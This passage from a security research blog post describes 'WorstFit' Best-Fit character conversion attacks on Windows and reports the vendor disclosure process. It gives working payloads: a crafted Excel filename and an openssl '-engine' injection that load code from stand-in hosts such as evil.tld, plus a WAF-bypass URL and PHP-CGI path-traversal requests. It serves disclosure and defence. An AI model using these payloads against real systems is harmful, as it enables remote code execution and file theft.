<p>Windows actually maintains a handler table to know which program to use to open a file when you double-click a file. You can use <code class="language-plaintext highlighter-rouge">ftype</code> and <code class="language-plaintext highlighter-rouge">assoc</code> to see which programs handle specific file extensions. The filename would also become part of the argument, which means we can apply our attack through that!</p>

<p><img src="/assets/img/blog/20250109/13.png" alt="" /></p>

<p>We then discovered that the executable of Microsoft Excel is vulnerable to the Argument Splitting attack. We can just rename the Excel file to the following name - translating all dots, (back-)slashes, and double quote to their fullwidth forms.</p>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">．．／．．／．．／Windows／win.ini＂ ／n ＂＼＼malicious.tld@80＼pwn.xlsx</code></p>
</blockquote>

<p>By combining two tricks, we can trigger an Argument Injection on <code class="language-plaintext highlighter-rouge">Excel.exe</code> with just 1-Click. Since Excel itself <a href="https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel">doesn’t have any good argument</a> for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!</p>

<iframe width="100%" height="315" src="https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<p><em>P.S. if you find a better argument that can directly lead to RCE, please let us know!</em> 🙂</p>

<h3 id="-environment-variable-confusion">🔥 Environment Variable Confusion</h3>

<p>When functions like <code class="language-plaintext highlighter-rouge">GetEnvironmentVariableA</code>, <code class="language-plaintext highlighter-rouge">GetEnvironmentStringsA</code>, or <code class="language-plaintext highlighter-rouge">char *getenv(const char *varname)</code> are used, they return the <strong>Best-Fit</strong> version of the environment variable. This subtle behavior can be exploited to bypass character restrictions, creating potential opportunities for attackers to slip through otherwise secure validations and introduce security vulnerabilities.</p>

<p><strong>Relevant API</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea"><code class="language-plaintext highlighter-rouge">GetEnvironmentVariableA</code></a>, <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv"><code class="language-plaintext highlighter-rouge">char *getenv(const char *varname)</code></a><br />
<strong>Affected Code Pages</strong>: No specific<br />
<strong>Threat Characters</strong>: No specific (for Apache HTTPd: 0x00-0xFF)</p>

<p>For this exploit scenario, the environment variables must be user-controllable, which often occurs when a parent process needs to pass information to a spawned process.</p>

<p>A common example is in <strong>CGI (Common Gateway Interface)</strong>, where much of the HTTP request information—such as query strings, HTTP headers, and more—is passed through environment variables. This creates an opportunity for attackers to manipulate these variables and exploit the behavior. Here, we present two case studies as a starting point to spark your further ideas.</p>

<h4 id="-case-study-1---waf-bypass">➤ Case study 1 - WAF bypass</h4>

<p>In some scenarios, a CGI script may act as a routing service. When this happens, the portion of the URL path after the CGI executable is stored in the environment variable <code class="language-plaintext highlighter-rouge">PATH_INFO</code>. A common use case might involve a developer trying to restrict remote access to sensitive endpoints, such as <code class="language-plaintext highlighter-rouge">/cgi.pl/admin</code> from the web server, instead of the CGI itself. For example, in an Apache setup, they might add the following rule to deny access:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Directory</span><span class="sr"> "/var/www/cgi-bin"</span><span class="p">&gt;
</span>    <span class="p">&lt;</span><span class="nl">If</span><span class="sr"> "%{REQUEST_URI} =~ m#/admin#"</span><span class="p">&gt;
</span>        <span class="nc">Require</span> <span class="ss">all</span> denied
    <span class="p">&lt;/</span><span class="nl">If</span><span class="p">&gt;
&lt;/</span><span class="nl">Directory</span><span class="p">&gt;
</span></code></pre></div></div>

<p>However, due to the <strong>WorstFit vulnerability</strong> in Perl on Windows, this rule can be bypassed by substituting characters in <code class="language-plaintext highlighter-rouge">admin</code> with their <strong>Best-Fit equivalents</strong>. For instance, in <strong>Code Page 1250</strong>, the character <code class="language-plaintext highlighter-rouge">à</code> (<code class="language-plaintext highlighter-rouge">U+00E0</code>) is converted to <code class="language-plaintext highlighter-rouge">a</code> during the ANSI conversion.</p>

<p>By crafting a URL like <code class="language-plaintext highlighter-rouge">/cgi.pl/%E0dmin</code>, an attacker can bypass the Nginx rule, as the server interprets it as a different path, but Perl’s CGI script retrieves the <code class="language-plaintext highlighter-rouge">PATH_INFO</code> environment variable with ANSI API, and processes it as <code class="language-plaintext highlighter-rouge">/admin</code> after the Best-Fit conversion.</p>

<h4 id="-case-study-2---php-cgi-local-file-inclusion-lfi">➤ Case study 2 - PHP-CGI Local File Inclusion (LFI)</h4>

<p>The previous example was hypothetical, but here’s a real-world case we discovered. In <strong>PHP-CGI on Windows</strong>, we identified a file existence check oracle and even a potential LFI (Local File Inclusion) vulnerability under certain configurations.</p>

<p>The root cause lies in how <code class="language-plaintext highlighter-rouge">PATH_INFO</code> — and other path-related environment variables — are handled. Let’s break it down:</p>

<p>Imagine a request URI like this:  <code class="language-plaintext highlighter-rouge">http://victim.tld/index.php/foo/bar</code></p>

<p>After the web server (e.g., IIS, Apache, or another PHP-CGI-compatible server) processes it, it generates several environment variables. Depending on the server, these might look like this in Apache:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">REDIRECT_URL</span><span class="o">=</span>/index.php/foo/bar
<span class="nv">REQUEST_URI</span><span class="o">=</span>/index.php/foo/bar
<span class="nv">PATH_INFO</span><span class="o">=</span>/index.php/foo/bar
<span class="nv">PATH_TRANSLATED</span><span class="o">=</span>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\i</span>ndex.php<span class="se">\f</span>oo<span class="se">\b</span>ar
</code></pre></div></div>

<p>Notice how the PHP script filename (<code class="language-plaintext highlighter-rouge">index.php</code>) and the additional path (<code class="language-plaintext highlighter-rouge">foo/bar</code>) are combined. From the environment variables alone, it’s unclear which part represents the PHP file and which is additional <code class="language-plaintext highlighter-rouge">PATH_INFO</code>. Resolving this ambiguity is left to <code class="language-plaintext highlighter-rouge">php-cgi.exe</code>. Hmm, it must be quite easy to make <code class="language-plaintext highlighter-rouge">php-cgi</code> confused right?</p>

<p>The first thought might be to try something like <code class="language-plaintext highlighter-rouge">http://victim.tld/index.php/../../../secret.txt</code>. But this apparently won’t work, as the web server normalizes and validates paths before passing them to PHP-CGI. So, how can we bypass this?</p>

<p>As we knew in the <strong>Filename Smuggling</strong> section, the Yen sign (<code class="language-plaintext highlighter-rouge">¥</code>) in the Japanese code page can be exploited. For example, by sending a request like <code class="language-plaintext highlighter-rouge">/index.php/..¥..¥windows/win.ini/foo</code>, you can potentially access arbitrary files. Here’s how it works:</p>

<ul>
  <li><strong>Web Server’s Perspective</strong>: The server treats the entire <code class="language-plaintext highlighter-rouge">/..¥..¥windows/win.ini/foo</code> as additional <code class="language-plaintext highlighter-rouge">PATH_INFO</code> and processes it as part of the request.</li>
  <li><strong>PHP-CGI’s Perspective</strong>: PHP-CGI receives things like <code class="language-plaintext highlighter-rouge">REQUEST_URI=/index.php/..\..\windows/win.ini/foo</code> and struggles to differentiate between the actual PHP file (<code class="language-plaintext highlighter-rouge">index.php</code>) and the <code class="language-plaintext highlighter-rouge">PATH_INFO</code> portion. This confusion allows the exploit to manipulate the behavior and access files beyond intended restrictions.</li>
</ul>

<p>This mismatch between how components interpret the request opens the door to potential vulnerabilities. Depending on the web server’s behavior and configuration, this can turn into a file existence oracle on <strong>Apache</strong>:</p>

<ul>
  <li><strong>Non-existing file</strong>: For a request like <code class="language-plaintext highlighter-rouge">/index.php/..¥..¥NONEXIST/</code>, PHP-CGI treats <code class="language-plaintext highlighter-rouge">/..¥..¥NONEXIST/</code> as additional <code class="language-plaintext highlighter-rouge">PATH_INFO</code> and renders <code class="language-plaintext highlighter-rouge">/index.php</code> as usual.</li>
  <li><strong>Existing file</strong>: For a request like <code class="language-plaintext highlighter-rouge">/index.php/..¥..¥windows/win.ini/</code>, PHP-CGI fails and produces a <code class="language-plaintext highlighter-rouge">No input file specified</code> error due to how it handles valid files internally.</li>
</ul>

<p>But why stop at just checking file existence? On an <strong>IIS server</strong> with the <code class="language-plaintext highlighter-rouge">doc_root</code> directive configured, this can lead to <strong>Local File Inclusion (LFI)</strong>. Using a path like <code class="language-plaintext highlighter-rouge">/index.php/..¥..¥..¥windows/win.ini/</code>, you can effectively include and read arbitrary files, such as <code class="language-plaintext highlighter-rouge">C:\Windows\win.ini</code>.</p>

<p><img src="/assets/img/blog/20250109/14.png" alt="" /></p>

<p>As an LFI vulnerability, this can surely escalate to a potential <strong>Remote Code Execution (RCE)</strong> in scenarios where the included file contains executable or user-controllable code.</p>

<blockquote>
  <p><strong>Note</strong>: This specific scenario is rare in real-world applications, so we classify it more as a bug rather than a vulnerability.</p>
</blockquote>

<p><br /></p>

<h2 id="the-duskor-dawnof-the-worstfit">The Dusk–or Dawn–of the WorstFit</h2>

<p>As mentioned earlier, we have identified several issues across programming languages, open-source projects, and Windows built-in command-line programs. As responsible researchers, we promptly reported these issues to their respective upstream maintainers. However, this process was quite challenging, the most debated topic is revolved around the <strong>Argument Splitting</strong>, and this section highlights some obstacles we encountered during the reporting process.</p>

<h4 id="-is-this-an-issue">🧐 <strong>Is this an issue?</strong></h4>

<p>This was the most common question raised by vendors. Those in opposition argued that “passing user inputs to the command line in itself is already a vulnerability”. Even they are properly escaped or have sanitization in place, the root of the problem is still that “developers should avoid such practices altogether”.</p>

<p>I am not sure if it’s fair to shift all the responsibility onto developers. Firstly, the operating system itself is already a scenario that highly requires user inputs. Additionally, with the increasing complexity of web applications, it is really difficult to completely eliminate user input.</p>

<h4 id="-who-is-responsible-for-that">🧐 <strong>Who is responsible for that?</strong></h4>

<p>Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code is embedded automatically during compilation (the compiler attaches the entry <code class="language-plaintext highlighter-rouge">mainCRTStartup()</code>, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because <strong>“the developer failed to use the correct <code class="language-plaintext highlighter-rouge">wmain()</code>”</strong>, or is it <strong>“CRT’s failure for not splitting the command line well and pass the wrong argument to <code class="language-plaintext highlighter-rouge">main()</code>”</strong>?</p>

<p>To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors">compiler-introduced security vulnerabilities</a>? 😉</p>

<h4 id="-its-really-hard-to-fix-it">😖 <strong>It’s really hard to fix it!</strong></h4>

<p>I believe most maintainers would be willing to help with a quick fix, even if it wasn’t categorized as a security issue. However, resolving this problem isn’t that as simple as just replacing the <strong><code class="language-plaintext highlighter-rouge">main()</code></strong> with its wide-character counterpart. Since the function signature has been changed, maintainers would need to rewrite all variable definitions and argument parsing logics, converting everything from simple <strong><code class="language-plaintext highlighter-rouge">char *</code></strong> to <strong><code class="language-plaintext highlighter-rouge">wchar_t *</code></strong>. This process can be painful and error-prone. 😵‍💫</p>

<p>We have also summarized some responses we received as follows:</p>

<h4 id="-curl">➤ Curl</h4>

<p>Curl said that this is a Windows feature and there are no plans to fix it. Interestingly, Microsoft’s <a href="https://curl.se/windows/microsoft.html">ported Curl</a> has properly modified the entry to <code class="language-plaintext highlighter-rouge">wmain()</code> on the contrary, so the built-in <code class="language-plaintext highlighter-rouge">curl.exe</code> on Windows is not impacted, only the binaries delivered by official  Curl are affected by the Argument Splitting attack.</p>

<p>Here are some responses from Curl. You can check the full report on <a href="https://hackerone.com/reports/2550951">HackerOne</a>.</p>

<blockquote>
  <p>I’m struggling to see how this is a curl problem. It looks like a Windows “feature” to me. It is being “helpful” and helps users to convert ascii-looking double quotes to ASCII double quotes.</p>

  <p>— 👤 Author of Curl</p>
</blockquote>

<blockquote>
  <p>If we can mitigate this we should probably consider that, but it is a hard problem and it certainly is not going to be solved in the short term. curl is a victim here, not the responsible party.</p>

  <p>— 👤 Author of Curl</p>
</blockquote>

<h4 id="-openssl">➤ OpenSSL</h4>

<p>This is an interesting case. OpenSSL provides an environment variable, <code class="language-plaintext highlighter-rouge">OPENSSL_WIN32_UTF8</code>, to handle arguments in Wide Character format. Although its original purpose was to correct issues with displaying UTF-8 in the UI, it also mitigates the Argument Splitting attack unintentionally!</p>

<p>However, most developers are still unaware of the need to set this environment variable while using the <code class="language-plaintext highlighter-rouge">openssl.exe</code> executable. As a result,it is still possible to leverage the <code class="language-plaintext highlighter-rouge">-engine</code> argument to execute arbitrary code in a default OpenSSL usage.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">passphrase</span> <span class="o">=</span> <span class="s">"pass</span><span class="se">\uFF02</span><span class="s"> </span><span class="se">\uFF02</span><span class="s">-engine</span><span class="se">\uFF02</span><span class="s"> </span><span class="se">\uFF02\\\\</span><span class="s">evil.tld</span><span class="se">\\</span><span class="s">malicious.dll"</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span>
    <span class="s">'openssl.exe'</span><span class="p">,</span> 
    <span class="s">"enc"</span><span class="p">,</span> 
    <span class="s">"-aes-256-cbc"</span><span class="p">,</span> 
    <span class="s">"-in"</span><span class="p">,</span> <span class="s">"in.txt"</span><span class="p">,</span> 
    <span class="s">"-out"</span><span class="p">,</span> <span class="s">"out.txt"</span><span class="p">,</span> 
    <span class="s">"-k"</span><span class="p">,</span> <span class="n">passphrase</span>
<span class="p">])</span>
</code></pre></div></div>

<h4 id="-perl">➤ Perl</h4>

<p>The official Perl did not provide prebuilt executables for Windows. Instead, third-party installers such as <a href="https://strawberryperl.com/">Strawberry Perl</a> or <a href="https://www.activestate.com/products/perl/">ActiveState Perl</a> are commonly used, and both of which are affected by the Argument Splitting attack. After having a discuss with the Perl maintainer, they concluded that <strong>“This seems more like a Microsoft bug than a Perl bug,”</strong> so this issue remains unresolved in Perl for now.</p>

<h4 id="-microsoft">➤ Microsoft</h4>

<p>We reported three cases to MSRC in total, but the communication process did not go well. All cases were initially rejected for not meeting their severity criteria. We re-opened the case several times and the Excel case was eventually accepted after our third attempt, while the other cases remain unresolved for today :(</p>

<p>Here is the reply:</p>

<blockquote>
  <p>The attack scenario here depends on a vulnerability in an unrelated application. The trick inherently requires a separate application that inserts untrusted input into a command line which is then executed. That in itself is a vulnerability; however, the technique which makes exploiting the issue possible does not qualify as a vulnerability.
— 👤 MSRC</p>
</blockquote>

<h4 id="-report-to-certcc">➤ Report to CERT/CC</h4>

<p>Since this is a systemic problem, we have also sought assistance from CERT/CC, hoping to coordinate and collaborate in an effort to find a better solution to address this issue. Microsoft eventually added one more <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea#security-remarks">warning</a> in their documentation after several months of effort. However, they only put this warning in the <code class="language-plaintext highlighter-rouge">GetCommandLineA</code>. There are still several ANSI APIs that need attention! ¯\_(ツ)_/¯</p>

<p>During the process of the vulnerability disclosure, we also investigated the open-source ecosystem to identify more affected applications, and tried to report them to their maintainers. Here is a list of what we have reported so far:</p>

<table>
  <thead>
    <tr>
      <th>Report Date</th>
      <th style="text-align: left">Vendor</th>
      <th style="text-align: left">Status</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>2024/05/07</td>
      <td style="text-align: left">PHP - <code class="language-plaintext highlighter-rouge">php-cgi.exe</code></td>
      <td style="text-align: left"><a href="https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv">CVE-2024-4577</a></td>
    </tr>
    <tr>
      <td>2024/06/13</td>
      <td style="text-align: left">Curl - <a href="https://curl.se/windows/">Official Build</a></td>
      <td style="text-align: left"><a href="https://hackerone.com/reports/2550951">Won’t Fix</a></td>
    </tr>
    <tr>
      <td>2024/06/13</td>
      <td style="text-align: left">Apache Subversion - <code class="language-plaintext highlighter-rouge">svn.exe</code></td>
      <td style="text-align: left"><a href="https://nvd.nist.gov/vuln/detail/cve-2024-45720">CVE-2024-45720</a></td>
    </tr>
    <tr>
      <td>2024/06/16</td>
      <td style="text-align: left">Microsoft Tar - <code class="language-plaintext highlighter-rouge">tar.exe</code></td>
      <td style="text-align: left">Won’t Fix</td>
    </tr>
    <tr>
      <td>2024/06/19</td>
      <td style="text-align: left">Microsoft Excel - <code class="language-plaintext highlighter-rouge">excel.exe</code></td>
      <td style="text-align: left"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026">CVE-2024-49026</a></td>
    </tr>
    <tr>
      <td>2024/06/19</td>
      <td style="text-align: left">Microsoft PhoneBook - <code class="language-plaintext highlighter-rouge">rasphone.exe</code></td>
      <td style="text-align: left">Won’t Fix</td>
    </tr>
    <tr>
      <td>2024/06/19</td>
      <td style="text-align: left">Oracle Java - <code class="language-plaintext highlighter-rouge">java.exe</code></td>
      <td style="text-align: left">Pending Fix</td>
    </tr>
    <tr>
      <td>2024/06/19</td>
      <td style="text-align: left">Perl - <code class="language-plaintext highlighter-rouge">perl.exe</code></td>
      <td style="text-align: left">Won’t Fix</td>
    </tr>
    <tr>
      <td>2024/07/15</td>
      <td style="text-align: left">Perforce - <code class="language-plaintext highlighter-rouge">p4.exe</code></td>
      <td style="text-align: left"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8067">CVE-2024-8067</a></td>
    </tr>
    <tr>
      <td>2024/08/05</td>
      <td style="text-align: left">PostgreSQL - <code class="language-plaintext highlighter-rouge">psql.exe</code></td>
      <td style="text-align: left">Won’t Fix</td>
    </tr>
    <tr>
      <td>2024/08/08</td>
      <td style="text-align: left">Putty - <code class="language-plaintext highlighter-rouge">plink.exe</code></td>
      <td style="text-align: left">Fixed</td>
    </tr>
    <tr>
      <td>2024/08/19</td>
      <td style="text-align: left">OpenSSL - <code class="language-plaintext highlighter-rouge">openssl.exe</code></td>
      <td style="text-align: left">Other</td>
    </tr>
    <tr>
      <td>2024/08/19</td>
      <td style="text-align: left">wkhtmltopdf - <code class="language-plaintext highlighter-rouge">wkhtmltopdf.exe</code></td>
      <td style="text-align: left">EOL</td>
    </tr>
    <tr>
      <td>2024/08/19</td>
      <td style="text-align: left">GNU Wget</td>
      <td style="text-align: left">No Reply</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<h2 id="epilogue">Epilogue</h2>

<p>So far, we have summarized attacks on WorstFit, including <strong>Filename Smuggling</strong>, <strong>Argument Splitting</strong>, and <strong>Environment Variable Confusion</strong>. Each attack has its applicable Code Pages. You can check the following table to see if you are at risk or not.</p>

<p><em>↓ Table of Affected Code Pages:</em>
<img src="/assets/img/blog/20250109/15.png" alt="" /></p>

<p><em>↓ World Map of WorstFit:</em>
<img src="/assets/img/blog/20250109/16.png" alt="" /></p>

<h3 id="mitigations">Mitigations</h3>

<p>As for how to mitigate such attacks, unfortunately, since this is an operating system-level problem, similar issues will continue to reappear — until Microsoft chooses to enable UTF-8 by default in all of their Windows editions. Before that, the only thing we can do is to encourage everyone, the users, organizations, and developers, to gradually phase out ANSI and promote the use of the Wide Character API, transiting the environment to a safer world step by step!</p>

<p><strong>As a user</strong>, the only thing you can do is to check the UTF-8 option on your Windows. However, since this feature is still in the BETA phase, it’s uncertain whether it will cause side effects or not.</p>

<p><img src="/assets/img/blog/20250109/17.png" alt="" /></p>

<p><strong>As a developer</strong>, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170"><code class="language-plaintext highlighter-rouge">_wgetcwd</code></a> and <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170"><code class="language-plaintext highlighter-rouge">_wgetenv</code></a>. Otherwise, the underlying implementation can still call the ANSI API, which is vulnerable to our WorstFit attacks, too!</p>

<h3 id="conclusion">Conclusion</h3>

<p>We hope this article provides you with an overview and enough insights to understand WorstFit Attack. Of course, this is not the end. Considering Windows’ commitment towards backward compatibility, you can imagine there are more hidden places the ANSI API would appear, for example, the Windows Registry queries like <code class="language-plaintext highlighter-rouge">RegQueryValueA</code> are definitely affected but need to find a vulnerable scenario, and we also observed Best-Fit behavior in Active Directory! 😉</p>

<p>We encourage more researchers to explore this attack surface and look forward to see more vulnerabilities in the future!</p>


                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/en/blog/author/orange">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/en/blog/author/orange">
                            <h3>Orange Tsai</h3>
                        </a>
                        <span>Principal Security Researcher</span>
                        <p>
                            I am Orange : )
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Services</h6>
        <ul>
            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
            <li><a href="/en/services/security-training/">Security Training</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Research</h6>
        <ul>
            <li><a href="/en/research/overview/">Overview</a></li>
            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
            <li><a href="/en/research/talks/">International Conferences</a></li>
            <li><a href="/en/research/cve/">CVE List</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Company</h6>
        <ul>
            <li><a href="/en/company/about/">Company Overview</a></li>
            <li><a href="/en/company/our-team/">Team Members</a></li>
            <li><a href="/en/company/history/">Achievements</a></li>
            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
            <li><a href="/en/contact/">Contact</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">News</h6>
        <ul>
            <li><a href="/en/blog/">Blog</a></li>
            <li><a href="/en/media-kit/">Media Resources</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2025 DEVCORE <b class="line-block">All rights reserved.</b></span>
            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>










